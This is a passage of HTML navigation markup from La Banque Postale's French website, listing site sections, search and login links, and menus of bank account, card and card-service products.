                                    </button>
                                            <span class=" m-title--h5 u-text-color--black u-spacing-s-left ">Associations</span>
                                        </div>
                                    </div>
                                    <ul class="m-metanavigation__box__list">

                                        <li class="a-text--small a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-none-xs-bottom">
                                            <a href="/associations.html" class="m-metanavigation__box__link ">Accueil site Associations</a>
                                            <svg class="a-icon--xs hidden-xs hidden-sm" aria-hidden="true" focusable="false">
                                        <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
                                    </svg>
                                        </li>
                                    </ul>
                                </div>

                            </li>

                            <li class="m-metanavigation__box a-navigation__list__item " title="Secteur public local">

                                <span class="m-title--h5 hidden-xs hidden-sm lato-bold u-align-center u-spacing-xs-bottom u-spacing-none-xs-bottom u-spacing-none-sm-bottom u-spacing-s-sm-left u-spacing-s-xs-left">
                            Secteur public local
                        </span>
                                <button class="js-metanavigation__box__btn m-title--h5 hidden-md hidden-lg lato-bold u-align-center u-spacing-xs-bottom u-spacing-none-xs-bottom u-spacing-none-sm-bottom u-spacing-s-sm-left u-spacing-s-xs-left">
                            Secteur public local
                        </button>
                                <svg class="a-navigation__list__item__icon a-icon--s hidden-md hidden-lg" aria-hidden="true" focusable="false">
                            <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
                        </svg>
                                <div class="m-header__panel--mobile u-align-center">
                                    <div class="m-header__panel__title hidden-md hidden-lg ">
                                        <div class="m-metanavigation__box__title">

                                            <button role="button" class="m-header__panel__back submenu hidden-md hidden-lg" title="Retour au premier niveau de la liste des sites">
                                        <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                            <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-left"></use>
                                        </svg>
                                        <span class="sr-only">Retour au premier niveau de la liste des sites</span>
                                    </button>
                                            <span class=" m-title--h5 u-text-color--black u-spacing-s-left ">Secteur public local</span>
                                        </div>
                                    </div>
                                    <ul class="m-metanavigation__box__list">

                                        <li class="a-text--small a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-none-xs-bottom">
                                            <a href="/collectivites.html" class="m-metanavigation__box__link ">Accueil site Collectivités Locales</a>
                                            <svg class="a-icon--xs hidden-xs hidden-sm" aria-hidden="true" focusable="false">
                                        <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
                                    </svg>
                                        </li>

                                        <li class="a-text--small a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-none-xs-bottom">
                                            <a href="/bailleurs-sociaux.html" class="m-metanavigation__box__link ">Accueil site Logement Social et Économie Mixte</a>
                                            <svg class="a-icon--xs hidden-xs hidden-sm" aria-hidden="true" focusable="false">
                                        <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
                                    </svg>
                                        </li>

                                        <li class="a-text--small a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-none-xs-bottom">
                                            <a href="/hopitaux.html" class="m-metanavigation__box__link ">Accueil site Hôpitaux et médico-social</a>
                                            <svg class="a-icon--xs hidden-xs hidden-sm" aria-hidden="true" focusable="false">
                                        <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
                                    </svg>
                                        </li>
                                    </ul>
                                </div>

                            </li>

                            <li class="m-metanavigation__box a-navigation__list__item " title="Groupe La Banque Postale">

                                <span class="m-title--h5 hidden-xs hidden-sm lato-bold u-align-center u-spacing-xs-bottom u-spacing-none-xs-bottom u-spacing-none-sm-bottom u-spacing-s-sm-left u-spacing-s-xs-left">
                            Groupe La Banque Postale
                        </span>
                                <button class="js-metanavigation__box__btn m-title--h5 hidden-md hidden-lg lato-bold u-align-center u-spacing-xs-bottom u-spacing-none-xs-bottom u-spacing-none-sm-bottom u-spacing-s-sm-left u-spacing-s-xs-left">
                            Groupe La Banque Postale
                        </button>
                                <svg class="a-navigation__list__item__icon a-icon--s hidden-md hidden-lg" aria-hidden="true" focusable="false">
                            <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
                        </svg>
                                <div class="m-header__panel--mobile u-align-center">
                                    <div class="m-header__panel__title hidden-md hidden-lg ">
                                        <div class="m-metanavigation__box__title">

                                            <button role="button" class="m-header__panel__back submenu hidden-md hidden-lg" title="Retour au premier niveau de la liste des sites">
                                        <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                            <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-left"></use>
                                        </svg>
                                        <span class="sr-only">Retour au premier niveau de la liste des sites</span>
                                    </button>
                                            <span class=" m-title--h5 u-text-color--black u-spacing-s-left ">Groupe La Banque Postale</span>
                                        </div>
                                    </div>
                                    <ul class="m-metanavigation__box__list">

                                        <li class="a-text--small a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-none-xs-bottom">
                                            <a href="https://www.labanquepostale.com/" class="m-metanavigation__box__link ">Accueil site Groupe</a>
                                            <svg class="a-icon--xs hidden-xs hidden-sm" aria-hidden="true" focusable="false">
                                        <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
                                    </svg>
                                        </li>

                                        <li class="a-text--small a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-none-xs-bottom">
                                            <a href="https://www.labanquepostale.com/newsroom-publications.html" class="m-metanavigation__box__link ">Journalistes</a>
                                            <svg class="a-icon--xs hidden-xs hidden-sm" aria-hidden="true" focusable="false">
                                        <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
                                    </svg>
                                        </li>

                                        <li class="a-text--small a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-none-xs-bottom">
                                            <a href="https://www.labanquepostale.com/investisseurs.html" class="m-metanavigation__box__link ">Investisseurs</a>
                                            <svg class="a-icon--xs hidden-xs hidden-sm" aria-hidden="true" focusable="false">
                                        <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
                                    </svg>
                                        </li>

                                        <li class="a-text--small a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-none-xs-bottom">
                                            <a href="https://www.labanquepostale.com/candidats.html" class="m-metanavigation__box__link ">Candidats</a>
                                            <svg class="a-icon--xs hidden-xs hidden-sm" aria-hidden="true" focusable="false">
                                        <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
                                    </svg>
                                        </li>
                                    </ul>
                                </div>

                            </li>

                        </ul>
                    </div>
                </div>
            </div>

            <div class="o-header__itemwrapper">

                <div class="m-searchbar">
                    <button class="m-searchbar__opener" title="Rechercher sur labanquepostale.fr">
        <svg viewBox="0 0 24 24" class="a-icon--s u-svg-color--grey_color_5" aria-hidden="true" focusable="false">
            <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-search"></use>
        </svg>
        <span class="sr-only">Rechercher</span>
    </button>
                    <form class="m-searchbar__form" role="search">
                        <label class="m-searchbar__label sr-only" for="searchTerm">Rechercher</label>
                        <input type="search" placeholder="Saisissez votre recherche" data-lbp-search-input="/particulier/resultat-recherche-particulier.html" name="searchTerm" id="searchTerm" autocorrect="off" autocapitalize="off" spellcheck="false" autocomplete="off" class="m-searchbar__input">
                        <button class="u-btn m-button--primary m-searchbar__submit" title="Rechercher sur labanquepostale.fr">
            <span class="m-button__icon a-icon--s">
                <svg viewBox="0 0 24 24" class="a-icon--s u-svg-color--white" aria-hidden="true" focusable="false">
                    <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-search"></use>
                </svg>
            </span>
            <span class="sr-only-xs sr-only-sm">Rechercher</span>
        </button>
                        <button class="m-searchbar__close__wrapper">
            <span class="sr-only">Fermer la recherche</span>
            <svg class="a-icon--s m-searchbar__close u-svg-color--grey_color_5" aria-hidden="true" focusable="false">
                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-close"></use>
            </svg>
        </button>
                    </form>
                    <div class="m-searchbar__autocomplete__wrapper hidden-sm hidden-md hidden-lg"></div>
                </div>
                <div class="m-header__links" data-client="true">

                    <a id="contact" href="/particulier/solutions-citoyennes.html" data-internal="false" class="m-header__links__item m-header__links__item__white a-text--small  u-spacing-s-right u-spacing-s-left u-spcing-2xs-xs-right u-spcing-2xs-xs-left">

                    <svg xmlns="http://www.w3.org/2000/svg" height=24px viewBox="0 0 24 24" id="ic-profile-citizen">
            <path fill-rule="evenodd" d="M5.075 3.063a1.923 1.923 0 012.56-.868 1.93 1.93 0 011.067 1.6c.021.33-.05.672-.202.967l-1.719 3.8c.94.03 1.705.792 1.865 1.858l.121.799c.09.6.378 1.144.835 1.576.584.55 1.016 1.426 1.153 2.339.138.91-.018 1.875-.416 2.577-.3.53-.326 1.235-.326 1.91v1.932a.5.5 0 01-1 0v-1.931c0-.81.035-1.662.456-2.405.225-.396.421-1.112.297-1.934-.124-.824-.52-1.45-.85-1.761a3.692 3.692 0 01-1.138-2.154l-.12-.8c-.09-.592-.458-.997-.916-1.007a.858.858 0 00-.708.31.915.915 0 00-.223.742l.673 4.474a.501.501 0 01-.989.148l-.673-4.474a1.913 1.913 0 01.462-1.55c.054-.063.12-.112.181-.166L7.6 4.329a.93.93 0 00.104-.47.927.927 0 00-.513-.768.922.922 0 00-1.22.418L3.363 8.77a3.48 3.48 0 00-.325 2.074l1.408 9.226a.5.5 0 01-.989.15L2.05 10.995a4.49 4.49 0 01.417-2.667zm11.254-.868a1.925 1.925 0 012.56.865l2.609 5.267c.41.83.555 1.75.417 2.666l-1.408 9.228a.5.5 0 01-.988-.15l1.408-9.228a3.489 3.489 0 00-.325-2.072l-2.608-5.265a.92.92 0 00-1.223-.414.922.922 0 00-.51.767.892.892 0 00.094.447l2.147 4.742c.06.053.126.101.18.162.377.428.545.992.46 1.551l-.671 4.474a.501.501 0 01-.99-.149l.673-4.474a.916.916 0 00-.223-.742.875.875 0 00-.708-.31c-.458.01-.826.415-.915 1.007l-.121.801a3.692 3.692 0 01-1.137 2.153c-.33.311-.727.937-.85 1.761-.125.822.07 1.538.296 1.935.42.742.457 1.594.457 2.404v1.931a.5.5 0 01-1 0v-1.93c0-.677-.026-1.38-.327-1.912-.398-.7-.553-1.665-.416-2.577.138-.913.569-1.787 1.153-2.339.457-.43.745-.976.835-1.575l.12-.8c.16-1.067.927-1.827 1.866-1.857l-1.73-3.822a1.855 1.855 0 01-.19-.945 1.93 1.93 0 011.065-1.6zM13.204 4.74c1.045 0 1.776.85 1.776 2.069 0 1.815-1.699 3.236-2.71 3.92a.651.651 0 01-.358.107.458.458 0 01-.272-.08c-1.052-.712-2.75-2.134-2.75-3.947 0-2.232 2.148-2.455 3.045-1.534a1.768 1.768 0 011.27-.535zm0 1a.77.77 0 00-.77.727.5.5 0 01-.998 0 .77.77 0 00-.77-.727c-.675 0-.776.67-.776 1.069 0 .935.742 1.995 2.045 2.935 1.303-.94 2.045-2 2.045-2.935 0-.66-.297-1.07-.776-1.07z"></path>
        </svg>
                        <span class="sr-only-xs">Solutions citoyennes</span>

                    </a>

                    <a id="client" href="/particulier/comptes-et-cartes/ouvrir-un-compte.html" data-internal="false" class="m-header__links__item m-header__links__item__blue a-text--small  u-spacing-s-right u-spacing-s-left u-spcing-2xs-xs-right u-spcing-2xs-xs-left">

                    <svg xmlns="http://www.w3.org/2000/svg" height=24px viewBox="0 0 24 24" id="ic-contact-relationship_remote">
            <path fill-rule="evenodd" d="M7.158 15.863c4.461 0 6.56 6.137 4.388 6.137H2.892c-2.172 0-.195-6.137 4.266-6.137zm0 1c-1.99 0-3.134 1.52-3.533 2.171-.552.904-.654 1.663-.612 1.966h8.393c.03-.315-.097-1.074-.662-1.965-.415-.652-1.593-2.172-3.586-2.172zm.05-7.608a2.833 2.833 0 110 5.666 2.833 2.833 0 010-5.666zm9.535-.545c4.46 0 6.559 6.137 4.388 6.137h-8.654c-2.171 0-.195-6.137 4.266-6.137zm-9.535 1.545c-1.01 0-1.833.82-1.833 1.832a1.834 1.834 0 003.665 0 1.835 1.835 0 00-1.832-1.832zm9.535-.545c-1.991 0-3.134 1.519-3.533 2.172-.552.903-.654 1.662-.612 1.965h8.393c.03-.315-.096-1.073-.662-1.964-.414-.653-1.593-2.173-3.586-2.173zm.05-7.608a2.832 2.832 0 110 5.664 2.832 2.832 0 010-5.664zm0 1c-1.01 0-1.833.822-1.833 1.832 0 1.01.822 1.833 1.832 1.833 1.01 0 1.832-.822 1.832-1.833 0-1.01-.822-1.832-1.831-1.832z"></path>
        </svg>
                        <span class="sr-only-xs">Je deviens client</span>

                    </a>

                    <a href="/particulier/connexion-espace-client.html" id="connect" class="m-header__links__item m-header__links__item__connect m-header__links__item__blue a-text--small" data-connected-label="Connecté" data-connected-acces-label="Accéder à mon compte sécurisé" data-connected-url="https://voscomptesenligne.labanquepostale.fr/voscomptes/canalXHTML/identif.ea?origin=particuliers" title="Me connecter à mon compte sécurisé">

                    <svg xmlns="http://www.w3.org/2000/svg" height=24px viewBox="0 0 24 24" id="ic-safety-locker-unlocked">
            <path fill-rule="evenodd" d="M12 2c2.897 0 5 2.313 5 5.5V9c1.106 0 2.006.9 2.006 2v9c0 1.1-.9 2-2 2h-10c-1.1 0-2-.9-2-2v-9c0-1.1.9-2 2-2H16V7.5C16 4.851 14.355 3 12 3c-1.406 0-2.575.65-3.293 1.83a.499.499 0 11-.854-.519C8.746 2.842 10.257 2 12 2zm5.006 8h-10c-.551 0-1 .448-1 1v9c0 .552.449 1 1 1h10c.55 0 1-.448 1-1v-9c0-.552-.45-1-1-1zm-5 2.5c.6 0 1.14.27 1.5.69.31.35.5.81.5 1.31 0 .438-.146.844-.39 1.174a.523.523 0 00-.11.312v1.996a.517.517 0 01-.518.518h-1.964a.517.517 0 01-.518-.518v-1.986a.523.523 0 00-.111-.312 1.988 1.988 0 01-.39-1.184c0-.51.19-.97.5-1.32.36-.42.9-.68 1.5-.68zm0 1a.967.967 0 00-.741.331.987.987 0 00-.26.669c0 .215.067.418.194.588.2.271.307.586.307.908V17.5h1v-1.514c0-.323.106-.636.307-.908a.967.967 0 00-.056-1.225.982.982 0 00-.751-.353z"></path>
        </svg>
                        <span class="sr-only-sm">Me connecter</span>
                    </a>

                </div>

                <div class="m-header__menu" id="headermenu">
                    <div class="headermenuline__wrapper"><span id="menu-h-line" class="animation-line"></span></div>
                    <a id="avoid-menu" tabindex="-1"></a>
                    <button class="m-header__menu__hamburger a-hamburger a-hamburger--slider" type="button" role="button" title="Ouvrir le menu" tabindex="0" data-close-title="Fermer le menu" data-open-title="Ouvrir le menu">
        <span class="m-header__menu__hamburger__label sr-only">Ouvrir le menu</span>
        <span class="a-hamburger__box">
            <span class="a-hamburger__inner" aria-hidden="true"></span>
        </span>
    </button>
                    <nav role="navigation" aria-label="Menu principal">
                        <ul class="m-header__menu__list m-header__panel--mobile u-spacing-none-xs u-spacing-none-sm u-spacing-s-top u-spacing-s-bottom">
                            <div class="visible-xs-block">

                                <a id="client" href="/particulier/comptes-et-cartes/ouvrir-un-compte.html" data-internal="false" class="m-header__links__item m-header__links__item__blue a-text--small  u-spacing-s-right u-spacing-s-left u-spcing-2xs-xs-right u-spcing-2xs-xs-left">

                                    <svg viewBox="0 0 24 24" class="a-icon--s" aria-hidden="true" focusable="false">
        <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-contact-relationship_remote"></use>
    </svg>
                                    <span class="sr-only-xs">Je deviens client</span>
                                    <svg class="a-icon--xs hidden-sm hidden-md hidden-lg" aria-hidden="true" focusable="false">
        <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
    </svg>
                                </a>
                            </div>

                            <li class="a-navigation__list__item a-navigation__menu__item u-margin-none-xs u-margin-none-sm u-spacing-s-sm" menu-index="0" data-level="1">

                                <button role="button" class="a-navigation__menu__item__label a-text--small js-navigation-menu-target js-tracking-item" aria-expanded="false">Comptes et cartes</button>
                                <svg class="a-navigation__list__item__icon a-icon--xs" aria-hidden="true" focusable="false">
                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
            </svg>
                                <span class="line--wrapper--vertical"></span>
                                <div class="m-header__submenu m-header__panel--mobile">
                                    <div class="m-header__submenu__wrapper">
                                        <div class="m-header__submenu__title m-header__panel__title u-margin-2xl-left u-margin-none-xs u-margin-none-sm u-spacing-lg-bottom">
                                            <div>
                                                <button role="button" class="m-header__panel__back submenu hidden-md hidden-lg" data-level="2">
                                <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                    <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-left"></use>
                                </svg>
                                <span class="sr-only-xs sr-only-sm u-hidden--all--md">Retour au menu principal</span>
                            </button>
                                                <p class="a-text--small lato-bold u-text-color--black">Comptes et cartes</p>
                                            </div>
                                            <p class="a-text--small hidden-sm hidden-xs">La Banque Postale vous propose des solutions adaptées dans tous les domaines de la banque et des assurances. Vous vous interrogez sur un de nos produits ou services ? N'hésitez pas à consulter nos fiches explicatives et à prendre rendez-vous avec l'un de nos conseillers.</p>
                                        </div>
                                        <div class="m-header__submenu__list__wrapper w100--sm  u-spacing-2xl-left u-spacing-none-sm u-spacing-none-xs">
                                            <span class="submenu-v-line animation-line"></span>
                                            <ul class="m-header__submenu__list u-margin-2xl-right u-margin-none-sm u-margin-none-xs" id="submenu-0">

                                                <li class="a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-2xs-top u-spacing-xs-bottom-sm u-spacing-xs-top-sm" data-level="2">
                                                    <span class="submenu-h-line animation-line"></span>

                                                    <button role="button" class="a-navigation__submenu__item__label a-text--small js-navigation-menu-target js-tracking-item" aria-expanded="false">Compte bancaire</button>
                                                    <svg class="a-navigation__list__item__icon a-icon--xs" aria-hidden="true" focusable="false">
                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
            </svg>
                                                    <div class="m-header__sublist__panel m-header__panel--mobile">
                                                        <div class="m-header__panel__title a-text--body hidden-md hidden-lg">
                                                            <div>
                                                                <button role="button" class="m-header__panel__back sublist" data-level="3">
                            <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-left"></use>
                            </svg>
                            <span class="sr-only-xs sr-only-sm u-hidden--all--md">Retour au menu Comptes et cartes</span>
                        </button>
                                                                <p class="a-text--small lato-bold u-text-color--black">Compte bancaire</p>
                                                            </div>
                                                        </div>
                                                        <ul class="m-header__sublist u-spacing-none-xs u-spacing-none-sm u-spacing-2xl-left">

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/comptes-et-cartes/comptes-bancaires/formule-de-compte.html" class="a-text--small js-tracking-item">Formule de Compte</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/comptes-et-cartes/comptes-bancaires/formule-de-compte-simplicite.html" class="a-text--small js-tracking-item">Formule de Compte Simplicité</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/comptes-et-cartes/comptes-bancaires/mobilite-bancaire.html" class="a-text--small js-tracking-item">Mobilité bancaire</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/comptes-et-cartes/comptes-bancaires/assurances.html" class="a-text--small js-tracking-item">Assurances au quotidien</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/comptes-et-cartes/comptes-bancaires/decouvert-autorise.html" class="a-text--small js-tracking-item">Découvert autorisé</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/comptes-et-cartes/comptes-bancaires/ouverture-de-compte-jeune.html" class="a-text--small js-tracking-item">Ouverture de compte spécial jeune</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3" last-item="">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/comptes-et-cartes/comptes-bancaires/ouverture-de-compte-mineur.html" class="a-text--small js-tracking-item">Ouvrir un compte à un mineur</a>
                                                                </span>
                                                            </li>

                                                        </ul>
                                                    </div>
                                                </li>

                                                <li class="a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-2xs-top u-spacing-xs-bottom-sm u-spacing-xs-top-sm" data-level="2">
                                                    <span class="submenu-h-line animation-line"></span>

                                                    <button role="button" class="a-navigation__submenu__item__label a-text--small js-navigation-menu-target js-tracking-item" aria-expanded="false">Cartes bancaires</button>
                                                    <svg class="a-navigation__list__item__icon a-icon--xs" aria-hidden="true" focusable="false">
                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
            </svg>
                                                    <div class="m-header__sublist__panel m-header__panel--mobile">
                                                        <div class="m-header__panel__title a-text--body hidden-md hidden-lg">
                                                            <div>
                                                                <button role="button" class="m-header__panel__back sublist" data-level="3">
                            <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-left"></use>
                            </svg>
                            <span class="sr-only-xs sr-only-sm u-hidden--all--md">Retour au menu Comptes et cartes</span>
                        </button>
                                                                <p class="a-text--small lato-bold u-text-color--black">Cartes bancaires</p>
                                                            </div>
                                                        </div>
                                                        <ul class="m-header__sublist u-spacing-none-xs u-spacing-none-sm u-spacing-2xl-left">

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/comptes-et-cartes/cartes-bancaires/carte-realys.html" class="a-text--small js-tracking-item">Carte Réalys</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/comptes-et-cartes/cartes-bancaires/carte-visa-classic.html" class="a-text--small js-tracking-item">Carte Visa Classic</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/comptes-et-cartes/cartes-bancaires/carte-visa-premier.html" class="a-text--small js-tracking-item">Carte Visa Premier</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/comptes-et-cartes/cartes-bancaires/carte-visa-platinum.html" class="a-text--small js-tracking-item">Carte Visa Platinum</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/comptes-et-cartes/cartes-bancaires/carte-visa-infinite.html" class="a-text--small js-tracking-item">Carte Visa Infinite</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/comptes-et-cartes/cartes-bancaires/carte-prepayee-de-la-banque-postale.html" class="a-text--small js-tracking-item">Carte Prépayée de La Banque Postale</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/comptes-et-cartes/cartes-bancaires/carte-protectys.html" class="a-text--small js-tracking-item">Carte Protectys</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3" last-item="">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/comptes-et-cartes/cartes-bancaires/carte-regliss.html" class="a-text--small js-tracking-item">Carte Regliss</a>
                                                                </span>
                                                            </li>

                                                        </ul>
                                                    </div>
                                                </li>

                                                <li class="a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-2xs-top u-spacing-xs-bottom-sm u-spacing-xs-top-sm" data-level="2">
                                                    <span class="submenu-h-line animation-line"></span>

                                                    <button role="button" class="a-navigation__submenu__item__label a-text--small js-navigation-menu-target js-tracking-item" aria-expanded="false">Services cartes</button>
                                                    <svg class="a-navigation__list__item__icon a-icon--xs" aria-hidden="true" focusable="false">
                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
            </svg>
                                                    <div class="m-header__sublist__panel m-header__panel--mobile">
                                                        <div class="m-header__panel__title a-text--body hidden-md hidden-lg">
                                                            <div>
                                                                <button role="button" class="m-header__panel__back sublist" data-level="3">
                            <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-left"></use>
                            </svg>
                            <span class="sr-only-xs sr-only-sm u-hidden--all--md">Retour au menu Comptes et cartes</span>
                        </button>
                                                                <p class="a-text--small lato-bold u-text-color--black">Services cartes</p>
                                                            </div>
                                                        </div>
                                                        <ul class="m-header__sublist u-spacing-none-xs u-spacing-none-sm u-spacing-2xl-left">

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/comptes-et-cartes/services-de-cartes/carte-option-credit.html" class="a-text--small js-tracking-item">Carte Option Crédit</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/comptes-et-cartes/services-de-cartes/service-debit-differe.html" class="a-text--small js-tracking-item">Service Débit Différé</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/comptes-et-cartes/services-de-cartes/service-e-carte-bleue.html" class="a-text--small js-tracking-item">e-Carte Bleue</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/comptes-et-cartes/services-de-cartes/paiement-sans-contact.html" class="a-text--small js-tracking-item">Paiement sans contact</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/comptes-et-cartes/services-de-cartes/apple-pay.html" class="a-text--small js-tracking-item">Apple Pay</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/comptes-et-cartes/services-de-cartes/paylib-sans-contact.html" class="a-text--small js-tracking-item">Paylib sans contact</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3">
                                                                <span class="a-navigation__sublist__item__label">
                <span class="sublist-h-line animation-line"></span>
                                                                <a href="/particulier/comptes-et-cartes/services-de-cartes/3d-secure.html" class="a-text--small js-tracking-item">3D Secure</a>
                                                                </span>
                                                            </li>

                                                            <li class="a-navigation__sublist__item" data-level="3" last-item="">
                                                                <span class="a-navigation__sublist__item__label">
